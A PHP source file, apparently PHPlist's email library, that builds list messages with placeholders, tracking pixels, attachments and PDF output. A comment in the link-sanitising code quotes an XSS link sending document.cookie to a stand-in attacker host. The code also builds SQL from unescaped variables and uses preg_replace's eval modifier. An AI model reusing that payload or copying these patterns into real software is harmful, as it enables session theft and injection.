<?
require_once "accesscheck.php";

# send an email library

if (PHPMAILER) {
	# phplistmailer, extended of the popular phpmail class
  # this is still very experimental
	include $GLOBALS["coderoot"] . "class.phplistmailer.php";
} else {
	include $GLOBALS["coderoot"] .'class.html.mime.mail.inc';
}

function sendEmail ($messageid,$email,$hash,$htmlpref = 0,$rssitems = array()) {
  global $strThisLink,$PoweredByImage,$PoweredByText,$tables,$cached,$pageroot,$website;
  if ($email == "")
    return;
  if (!$cached[$messageid]) {
  	$domain = getConfig("domain");
    $message = Sql_query("select * from {$tables["message"]} where id = $messageid");
    $cached[$messageid] = array();
    $message = Sql_fetch_array($message);
    if (ereg("([^ ]+@[^ ]+)",$message["fromfield"],$regs)) {
      # if there is an email in the from, rewrite it as "name <email>"
      $message["fromfield"] = ereg_replace($regs[0],"",$message["fromfield"]);
      $cached[$messageid]["fromemail"] = $regs[0];
      # if the email has < and > take them out here
      $cached[$messageid]["fromemail"] = ereg_replace("<","",$cached[$messageid]["fromemail"]);
      $cached[$messageid]["fromemail"] = ereg_replace(">","",$cached[$messageid]["fromemail"]);
      # make sure there are no quotes around the name
      $cached[$messageid]["fromname"] = ereg_replace('"',"",ltrim(rtrim($message["fromfield"])));
    } elseif (ereg(" ",$message["fromfield"],$regs)) {
      # if there is a space, we need to add the email
      $cached[$messageid]["fromname"] = stripslashes($message["fromfield"]);
      $cached[$messageid]["fromemail"] = "listmaster@$domain";
    } else {
      $cached[$messageid]["fromemail"] = stripslashes($message["fromfield"]) . "@$domain";
      $cached[$messageid]["fromname"] = stripslashes($message["fromfield"]) . "@$domain";
    }
    # erase double spacing
    while (ereg("  ",$cached[$messageid]["fromname"]))
    $cached[$messageid]["fromname"] = eregi_replace("  "," ",$cached[$messageid]["fromname"]);
    $cached[$messageid]["to"] = stripslashes($message["tofield"]);
    $cached[$messageid]["subject"] = stripslashes($message["subject"]);
    $cached[$messageid]["replyto"] = stripslashes($message["replyto"]);
    $cached[$messageid]["content"] = stripslashes($message["message"]);
    $cached[$messageid]["footer"] = stripslashes($message["footer"]);
    $cached[$messageid]["htmlformatted"] = $message["htmlformatted"];
    $cached[$messageid]["sendformat"] = $message["sendformat"];
    if ($message["template"]) {
      $req = Sql_Fetch_Row_Query("select template from {$tables["template"]} where id = {$message["template"]}");
      $cached[$messageid]["template"] = stripslashes($req[0]);
      $cached[$messageid]["templateid"] = $message["template"];
   #   dbg("TEMPLATE: ".$req[0]);
    }
    
    ## @@ put this here, so it can become editable per email sent out at a later stage
    $cached[$messageid]["html_charset"] = getConfig("html_charset");
    ## @@ need to check on validity of charset
    if (!$cached[$messageid]["html_charset"])
    	$cached[$messageid]["html_charset"] = 'iso-8859-1';
    $cached[$messageid]["text_charset"] = getConfig("text_charset");
    if (!$cached[$messageid]["text_charset"])
    	$cached[$messageid]["text_charset"] = 'iso-8859-1';
  }# else
  #	dbg("Using cached {$cached[$messageid]["fromemail"]}");
  if (VERBOSE)
    output("Sending message $messageid with subject{$cached[$messageid]["subject"]} to $email\n");

  $msg = $cached[$messageid]["content"];
  $user_att = getUserAttributeValues($email);
  while (list($att_name,$att_value) = each ($user_att)) {
    if (eregi("\[".$att_name."\]",$msg,$regs))
      $msg = eregi_replace("\[".$att_name."\]",$att_value,$msg);
  }
  
  # erase any placeholders that were not found
#  $msg = ereg_replace("\[[A-Z ]+\]","",$msg);

  $url = getConfig("unsubscribeurl");$sep = ereg('\?',$url)?'&':'?';
  $text["unsubscribe"] = sprintf('%s%suid=%s',$url,$sep,$hash);
  $html["unsubscribe"] = sprintf('<a href="%s%suid=%s">%s</a>',$url,$sep,$hash,$strThisLink);
  $text["signature"] = "\n\n--\nPowered by PHPlist, www.phplist.com --\n\n";
  $url = getConfig("preferencesurl");$sep = ereg('\?',$url)?'&':'?';
  $html["preferences"] = sprintf('<a href="%s%suid=%s">%s</a>',$url,$sep,$hash,$strThisLink);
  $text["preferences"] = sprintf('%s%suid=%s',$url,$sep,$hash);
/*
	We request you retain the signature below in your emails including the links.
	This not only gives respect to the large amount of time given freely
  by the developers	but also helps build interest, traffic and use of
  PHPlist, which is beneficial to it's future development.
  
  You can configure how the credits are added to your pages and emails in your
  config file.

	Michiel Dethmers, Tincan Ltd 2003
*/
  if (!EMAILTEXTCREDITS) {
  	$html["signature"] = $PoweredByImage;#'<div align="center" id="signature"><a href="http://www.phplist.com"><img src="powerphplist.png" width=88 height=31 title="Powered by PHPlist" alt="Powered by PHPlist" border="0"></a></div>';
    # oops, accidentally became spyware, never intended that, so take it out again :-)
  	$html["signature"] = preg_replace('/src=".*power-phplist.png"/','src="powerphplist.png"',$html["signature"]);
  } else {
		$html["signature"] = $PoweredByText;
  }

  if (preg_match("/##LISTOWNER=(.*)/",$msg,$regs)) {
    $listowner = $regs[1];
    $msg = ereg_replace($regs[0],"",$msg);
  }

	if ($cached[$messageid]["htmlformatted"]) {
  	$textcontent = stripHTML($msg);
    $htmlcontent = $msg;
  } else {
  	$textcontent = $msg;
    $htmlcontent = parseText($msg);
  }

  if ($cached[$messageid]["template"])
    # template used
    $htmlmessage = eregi_replace("\[CONTENT\]",$htmlcontent,$cached[$messageid]["template"]);
  else
    # no template used
    $htmlmessage = $htmlcontent;
  $textmessage = $textcontent;

  foreach (array("preferences","unsubscribe","signature") as $item) {
    if (eregi('\['.$item.'\]',$htmlmessage,$regs)) {
      $htmlmessage = eregi_replace('\['.$item.'\]',$html[$item],$htmlmessage);
      unset($html[$item]);
    }
    if (eregi('\['.$item.'\]',$textmessage,$regs)) {
      $textmessage = eregi_replace('\['.$item.'\]',$text[$item],$textmessage);
      unset($text[$item]);
    }
  }
  $text["footer"] = eregi_replace("\[UNSUBSCRIBE\]",$text["unsubscribe"],$cached[$messageid]["footer"]);
  $html["footer"] = eregi_replace("\[UNSUBSCRIBE\]",$html["unsubscribe"],$cached[$messageid]["footer"]);
  $text["footer"] = eregi_replace("\[PREFERENCES\]",$text["preferences"],$text["footer"]);
  $html["footer"] = eregi_replace("\[PREFERENCES\]",$html["preferences"],$html["footer"]);
  $html["footer"] = nl2br($html["footer"]);

  if (eregi("\[FOOTER\]",$htmlmessage))
    $htmlmessage = eregi_replace("\[FOOTER\]",$html["footer"],$htmlmessage);
  else
    $htmlmessage .= '<br /><br />'.$html["footer"];
  if (eregi("\[SIGNATURE\]",$htmlmessage))
    $htmlmessage = eregi_replace("\[SIGNATURE\]",$html["signature"],$htmlmessage);
  else
    $htmlmessage .= '<br />'.$html["signature"];
  if (eregi("\[FOOTER\]",$textmessage))
    $textmessage = eregi_replace("\[FOOTER\]",$text["footer"],$textmessage);
  else
    $textmessage .= "\n\n".$text["footer"];
  if (eregi("\[SIGNATURE\]",$textmessage))
    $textmessage = eregi_replace("\[SIGNATURE\]",$text["signature"],$textmessage);
  else
    $textmessage .= "\n".$text["signature"];

#  $req = Sql_Query(sprintf('select filename,data from %s where template = %d',
#    $tables["templateimage"],$cached[$messageid]["templateid"]));

  $htmlmessage = eregi_replace("\[USERID\]",$hash,$htmlmessage);
  $htmlmessage = eregi_replace("\[USERTRACK\]",'<img src="http://'.$website.$pageroot.'/ut.php?u='.$hash.'&m='.$messageid.'" width="1" height="1" border="0">',$htmlmessage);
  if ($listowner) {
    $att_req = Sql_Query("select name,value from {$tables["adminattribute"]},{$tables["admin_attribute"]} where {$tables["adminattribute"]}.id = {$tables["admin_attribute"]}.adminattributeid and {$tables["admin_attribute"]}.adminid = $listowner");
    while ($att = Sql_Fetch_Array($att_req))
      $htmlmessage = preg_replace("#\[LISTOWNER.".strtoupper(preg_quote($att["name"]))."\]#",$att["value"],$htmlmessage);
  }

  if (is_array($GLOBALS["default_config"]))
  while (list($key,$val) = each($GLOBALS["default_config"])) {
    if (is_array($val)) {
		  $htmlmessage = eregi_replace("\[$key\]",getConfig($key),$htmlmessage);
		  $textmessage = eregi_replace("\[$key\]",getConfig($key),$textmessage);
    }
  }

  if (ENABLE_RSS && sizeof($rssitems)) {
  	$rssentries = array();
  	$request = join(",",$rssitems);
    $texttemplate = getConfig("rsstexttemplate");
    $htmltemplate = getConfig("rsshtmltemplate");
		$textseparatortemplate = getConfig("rsstextseparatortemplate");
		$htmlseparatortemplate = getConfig("rsshtmlseparatortemplate");
    $req = Sql_Query("select * from {$tables["rssitem"]} where id in ($request) order by list,added");
		$curlist = "";
    while ($row = Sql_Fetch_array($req)) {
			if ($curlist != $row["list"]) {
				$row["listname"] = ListName($row["list"]);
				$curlist = $row["list"];
				$rssentries["text"] .= parseRSSTemplate($textseparatortemplate,$row);
				$rssentries["html"] .= parseRSSTemplate($htmlseparatortemplate,$row);
			}

    	$data_req = Sql_Query("select * from {$tables["rssitem_data"]} where itemid = {$row["id"]}");
      while ($data = Sql_Fetch_Array($data_req))
      	$row[$data["tag"]] = $data["data"];

    	$rssentries["text"] .= stripHTML(parseRSSTemplate($texttemplate,$row));
    	$rssentries["html"] .= parseRSSTemplate($htmltemplate,$row);
    }
    $htmlmessage = eregi_replace("\[RSS\]",$rssentries["html"],$htmlmessage);
    $textmessage = eregi_replace("\[RSS\]",$rssentries["text"],$textmessage);
  }

  # remove any existing placeholders
  $htmlmessage = ereg_replace("\[[A-Z\. ]+\]","",$htmlmessage);
  $textmessage = ereg_replace("\[[A-Z\. ]+\]","",$textmessage);

  # particularly Outlook seems to have trouble if it is not \r\n
  # reports have come that instead this creates lots of trouble
	# this is now done in the global sendMail function, so it is not
  # necessary here
/*  if (USE_CARRIAGE_RETURNS) {
		$htmlmessage = preg_replace("/\r?\n/", "\r\n", $htmlmessage);
		$textmessage = preg_replace("/\r?\n/", "\r\n", $textmessage);
  }
*/
  # build the email
  if (!PHPMAILER) {
    $mail = new html_mime_mail(
      array('X-Mailer: PHPlist v'.VERSION,
            "X-MessageId: $messageid",
            "X-ListMember: $email",
            "Precedence: bulk",
						"List-Help: <".$text["preferences"].">",
						"List-Unsubscribe: <".$text["unsubscribe"].">",
						"List-Subscribe: <".getConfig("subscribeurl").">",
						"List-Owner: <mailto:".getConfig("admin_address").">"
    ));
  } else {
	  $mail = new PHPlistMailer($messageid,$email);
		##$mail->IsSMTP();
  }

  # so what do we actually send?
  switch($cached[$messageid]["sendformat"]) {
    case "HTML":
      # send html to users who want it and text to everyone else
		  list($dummy,$domaincheck) = split('@',$email);
			$text_domains = getConfig("alwayssendtextto");
      if (is_array($text_domains) && in_array($domaincheck,$text_domains)) {
      	$htmlpref = 0;
      }
      if ($htmlpref) {
      	Sql_Query("update {$tables["message"]} set ashtml = ashtml + 1 where id = $messageid");
  			if (ENABLE_RSS && sizeof($rssitems))
	        updateRSSStats($rssitems,"ashtml");
      #  dbg("Adding HTML ".$cached[$messageid]["templateid"]);
				$mail->add_html($htmlmessage,"",$cached[$messageid]["templateid"]);
        addAttachments($messageid,$mail,"HTML");
      } else {
      	Sql_Query("update {$tables["message"]} set astext = astext + 1 where id = $messageid");
  			if (ENABLE_RSS && sizeof($rssitems))
	        updateRSSStats($rssitems,"astext");
      	$mail->add_text($textmessage);
        addAttachments($messageid,$mail,"text");
      }
      break;
    case "both":
    case "text and HTML":
      # send one big file to users who want html and text to everyone else
      if ($htmlpref) {
      	Sql_Query("update {$tables["message"]} set astextandhtml = astextandhtml + 1 where id = $messageid");
  			if (ENABLE_RSS && sizeof($rssitems))
	        updateRSSStats($rssitems,"ashtml");
      #  dbg("Adding HTML ".$cached[$messageid]["templateid"]);
    		$mail->add_html($htmlmessage,$textmessage,$cached[$messageid]["templateid"]);
        addAttachments($messageid,$mail,"HTML");
      } else {
      	Sql_Query("update {$tables["message"]} set astext = astext + 1 where id = $messageid");
  			if (ENABLE_RSS && sizeof($rssitems))
	        updateRSSStats($rssitems,"astext");
      	$mail->add_text($textmessage);
        addAttachments($messageid,$mail,"text");
      }
      break;
    case "PDF":
      # send a PDF file to users who want html and text to everyone else
      if (ENABLE_RSS && sizeof($rssitems))
        updateRSSStats($rssitems,"astext");
      if ($htmlpref) {
      	Sql_Query("update {$tables["message"]} set aspdf = aspdf + 1 where id = $messageid");
        $pdffile = createPdf($textmessage);
        if (is_file($pdffile) && filesize($pdffile)) {
          $fp = fopen($pdffile,"r");
          if ($fp) {
            $contents = fread($fp,filesize($pdffile));
            fclose($fp);
           unlink($pdffile);
           $html = '<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
              <html>
              <head>
                <title></title>
              </head>
              <body>
              <embed src="message.pdf" width="450" height="450" href="message.pdf"></embed>
              </body>
              </html>';
#            $mail->add_html($html,$textmessage);
#						$mail->add_text($textmessage);
            $mail->add_attachment($contents,
              "message.pdf",
              "application/pdf");
          }
        }
        addAttachments($messageid,$mail,"HTML");
      } else {
      	Sql_Query("update {$tables["message"]} set astext = astext + 1 where id = $messageid");
      	$mail->add_text($textmessage);
        addAttachments($messageid,$mail,"text");
      }
      break;
    case "text and PDF":
      if (ENABLE_RSS && sizeof($rssitems))
        updateRSSStats($rssitems,"astext");
      # send a PDF file to users who want html and text to everyone else
      if ($htmlpref) {
      	Sql_Query("update {$tables["message"]} set astextandpdf = astextandpdf + 1 where id = $messageid");
        $pdffile = createPdf($textmessage);
        if (is_file($pdffile) && filesize($pdffile)) {
          $fp = fopen($pdffile,"r");
          if ($fp) {
            $contents = fread($fp,filesize($pdffile));
            fclose($fp);
            unlink($pdffile);
           $html = '<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
              <html>
              <head>
                <title></title>
              </head>
              <body>
              <embed src="message.pdf" width="450" height="450" href="message.pdf"></embed>
              </body>
              </html>';
 #           $mail->add_html($html,$textmessage);
 						$mail->add_text($textmessage);
            $mail->add_attachment($contents,
              "message.pdf",
              "application/pdf");
          }
        }
        addAttachments($messageid,$mail,"HTML");
      } else {
      	Sql_Query("update {$tables["message"]} set astext = astext + 1 where id = $messageid");
      	$mail->add_text($textmessage);
        addAttachments($messageid,$mail,"text");
      }
      break;
    case "text":
    default:
      # send as text
      if (ENABLE_RSS && sizeof($rssitems))
        updateRSSStats($rssitems,"astext");
    	Sql_Query("update {$tables["message"]} set astext = astext + 1 where id = $messageid");
     	$mail->add_text($textmessage);
      addAttachments($messageid,$mail,"text");
      break;
  }
	$mail->build_message(
  	array(
    	"html_charset" => $cached[$messageid]["html_charset"],
      "text_charset" => $cached[$messageid]["text_charset"])
    );

  if (!TEST) {
  	if (!$mail->send("", $email, $cached[$messageid]["fromname"], $cached[$messageid]["fromemail"],$cached[$messageid]["subject"])) {
			logEvent("Error sending message $messageid to $email");
  	}
  }
}

function addAttachments($msgid,&$mail,$type) {
	global $attachment_repository,$website,$pageroot,$tables;
  if (ALLOW_ATTACHMENTS) {
    $req = Sql_Query("select * from {$tables["message_attachment"]},{$tables["attachment"]}
      where {$tables["message_attachment"]}.attachmentid = {$tables["attachment"]}.id and
      {$tables["message_attachment"]}.messageid = $msgid");
    if (!Sql_Affected_Rows())
      return;
    if ($type == "text") {
      $mail->append_text($GLOBALS["strAttachmentIntro"]."\n");
    }

    while ($att = Sql_Fetch_array($req)) {
    	switch ($type) {
      	case "HTML":
        	if (is_file($GLOBALS["attachment_repository"]."/".$att["filename"]) && filesize($GLOBALS["attachment_repository"]."/".$att["filename"])) {
            $fp = fopen($GLOBALS["attachment_repository"]."/".$att["filename"],"r");
            if ($fp) {
              $contents = fread($fp,filesize($GLOBALS["attachment_repository"]."/".$att["filename"]));
              fclose($fp);
              $mail->add_attachment($contents,
                basename($att["remotefile"]),
                $att["mimetype"]);
            }
          } elseif (is_file($att["remotefile"]) && filesize($att["remotefile"])) {
          	# handle local filesystem attachments
            $fp = fopen($att["remotefile"],"r");
            if ($fp) {
              $contents = fread($fp,filesize($att["remotefile"]));
              fclose($fp);
              $mail->add_attachment($contents,
                basename($att["remotefile"]),
                $att["mimetype"]);
		          list($name,$ext) = explode(".",basename($att["remotefile"]));
              # create a temporary file to make sure to use a unique file name to store with
              $newfile = tempnam($GLOBALS["attachment_repository"],$name);
              $newfile .= ".".$ext;
              $newfile = basename($newfile);
              $fd = fopen( $GLOBALS["attachment_repository"]."/".$newfile, "w" );
              fwrite( $fd, $contents );
              fclose( $fd );
              Sql_Query(sprintf('update %s set filename = "%s" where id = %d',
              	$GLOBALS["tables"]["attachment"],$newfile,$att["attachmentid"]));
            }
					} else {
          	logEvent("Attachment ".$att["remotefile"]." does not exist");
            $msg = "Error, when trying to send message $msgid the attachment
            	".$att["remotefile"]." could not be found";
            sendMail(getConfig("report_address"),"Mail list error",$msg,"");
					}
         	break;
       	case "text":
        	$viewurl = "http://".$website.$pageroot.'/dl.php?id='.$att["id"];
          $mail->append_text($att["description"]."\n".$GLOBALS["strLocation"].": ".$viewurl);
          break;
      }
    }
  }
}

function createPDF($text) {
	if (!isset($GLOBALS["pdf_font"])) {
  	$GLOBALS["pdf_font"] = 'Arial';
  	$GLOBALS["pdf_fontsize"] = 12;
 	}
  $pdf=new FPDF();
  $pdf->SetCreator("PHPlist version ".VERSION);
  $pdf->Open();
  $pdf->AliasNbPages();
  $pdf->AddPage();
  $pdf->SetFont($GLOBALS["pdf_font"],$GLOBALS["pdf_fontstyle"],$GLOBALS["pdf_fontsize"]);
	$pdf->Write((int)$GLOBALS["pdf_fontsize"]/2,$text);
  $fname = tempnam($GLOBALS["tmpdir"],"pdf");
  $pdf->Output($fname,false);
  return $fname;
}

function replaceChars($text) {
// $document should contain an HTML document.
// This will remove HTML tags, javascript sections
// and white space. It will also convert some
// common HTML entities to their text equivalent.

$search = array ("'<script[^>]*?>.*?</script>'si",  // Strip out javascript
                 "'<[\/\!]*?[^<>]*?>'si",  // Strip out html tags
 #                "'([\r\n])[\s]+'",  // Strip out white space
                 "'&(quot|#34);'i",  // Replace html entities
                 "'&(amp|#38);'i",
                 "'&(lt|#60);'i",
                 "'&(gt|#62);'i",
                 "'&(nbsp|#160);'i",
                 "'&(iexcl|#161);'i",
                 "'&(cent|#162);'i",
                 "'&(pound|#163);'i",
                 "'&(copy|#169);'i",
                 "'&#(\d+);'e");  // evaluate as php

$replace = array ("",
                  "",
  #                "\\1",
                  "\"",
                  "&",
                  "<",
                  ">",
                  " ",
                  chr(161),
                  chr(162),
                  chr(163),
                  chr(169),
                  "chr(\\1)");
#"
$text = preg_replace ($search, $replace, $text);
  return $text;
}

function stripHTML($text) {
	# strip HTML, and turn links into the full URL
	$text = preg_replace("/\r/","",$text);

	$text = preg_replace("/\n/","###NL###",$text);
 	$text = preg_replace("/<script[^>]*>(.*?)<\/script\s*>/is","",$text);
 	$text = preg_replace("/<style[^>]*>(.*?)<\/style\s*>/is","",$text);

  $text = preg_replace("/<a href=\"(.*?)\"[^>]*>(.*?)<\/a>/is","\\2\n{\\1}",$text,100);

	$text = preg_replace("/<b>(.*?)<\/b\s*>/is","*\\1*",$text);
	$text = preg_replace("/<h[\d]>(.*?)<\/h[\d]\s*>/is","**\\1**\n",$text);
  $text = preg_replace("/\s+/"," ",$text);
  $text = preg_replace("/<i>(.*?)<\/i\s*>/is","/\\1/",$text);
  $text = preg_replace("/<\/tr\s*?>/","<\/tr>\n\n",$text);
  $text = preg_replace("/<\/p\s*?>/","<\/p>\n\n",$text);
  $text = preg_replace("/<br\s*?>/","<br>\n",$text);
  $text = preg_replace("/<br\s*?\/>/","<br\/>\n",$text);
  $text = preg_replace("/<table/","\n\n<table",$text);
	$text = strip_tags($text);
  $text = replaceChars($text);
	$text = preg_replace("/###NL###/","\n",$text);
	while (preg_match("/  /",$text))
		$text = preg_replace("/  /"," ",$text);
	while (preg_match("/\n\n\n/",$text))
		$text = preg_replace("/\n\n\n/","\n\n",$text);
  $text = wordwrap($text,70);
  return $text;
}

function parseText($text) {
  # bug in PHP? get rid of newlines at the beginning of text
  $text = ltrim($text);

  # make urls and emails clickable
  $text = eregi_replace("([\._a-z0-9-]+@[\.a-z0-9-]+)",'<a href="mailto:\\1" class="email">\\1</a>',$text);
  $link_pattern="/(.*)<a.*href\s*=\s*\"(.*?)\"\s*(.*?)>(.*?)<\s*\/a\s*>(.*)/is";

  $i=0;
  while (preg_match($link_pattern, $text, $matches)){
    $url=$matches[2];
    $rest = $matches[3];
    if (!preg_match("/^(http:)|(mailto:)|(ftp:)|(https:)/i",$url)){
      # avoid this
      #<a href="javascript:window.open('http://hacker.com?cookie='+document.cookie)">
      $url = preg_replace("/:/","",$url);
    }
    $link[$i]= '<a href="'.$url.'" '.$rest.'>'.$matches[4].'</a>';
    $text = $matches[1]."%%$i%%".$matches[5];
    $i++;
  }

  $text = preg_replace("/(www\.[a-zA-Z0-9\.\/#~:?+=&%@!_\\-]+)/i", "http://\\1"  ,$text);#make www. -> http://www.
  $text = preg_replace("/(https?:\/\/)http?:\/\//i", "\\1"  ,$text);#take out duplicate schema
  $text = preg_replace("/(ftp:\/\/)http?:\/\//i", "\\1"  ,$text);#take out duplicate schema
  $text = preg_replace("/(https?:\/\/)(?!www)([a-zA-Z0-9\.\/#~:?+=&%@!_\\-]+)/i", "<a href=\"\\1\\2\" class=\"url\"  target=\"_blank\">\\1\\2</a>"  ,$text); #eg-- http://kernel.org -> <a href"http://kernel.org" target="_blank">http://kernel.org</a>
  $text = preg_replace("/(https?:\/\/)(www\.)([a-zA-Z0-9\.\/#~:?+=&%@!\\-_]+)/i", "<a href=\"\\1\\2\\3\" class=\"url\" target=\"_blank\">\\2\\3</a>"  ,$text); #eg -- http://www.google.com -> <a href"http://www.google.com" target="_blank">www.google.com</a>

  for ($j = 0;$j<$i;$j++) {
    $replacement = $link[$j];
    $text = preg_replace("/\%\%$j\%\%/",$replacement, $text);
  }

  # hmm, regular expression choke on some characters in the text
  # first replace all the brackets with placeholders.
  # we cannot use htmlspecialchars or addslashes, because some are needed

  $text = ereg_replace("\(","<!--LB-->",$text);
  $text = ereg_replace("\)","<!--RB-->",$text);
  $text = preg_replace('/\$/',"<!--DOLL-->",$text);

  $paragraph = '<p>';
  $br = '<br />';
  $text = ereg_replace("\r","",$text);
  $text = ereg_replace("\n\n","\n".$paragraph,$text);
  $text = ereg_replace("\n","$br\n",$text);

  # reverse our previous placeholders
  $text = ereg_replace("<!--LB-->","(",$text);
  $text = ereg_replace("<!--RB-->",")",$text);
  $text = ereg_replace("<!--DOLL-->","\$",$text);
  return $text;
}

# make sure the 0 template has the powered by image
Sql_Query(sprintf('select * from %s where filename = "%s" and template = 0',
  $tables["templateimage"],"powerphplist.png"));
if (!Sql_Affected_Rows())
  Sql_Query(sprintf('insert into %s (template,mimetype,filename,data,width,height)
  values(0,"%s","%s","%s",%d,%d)',
  $tables["templateimage"],"image/png","powerphplist.png",
  $newpoweredimage,
  70,30));


?>


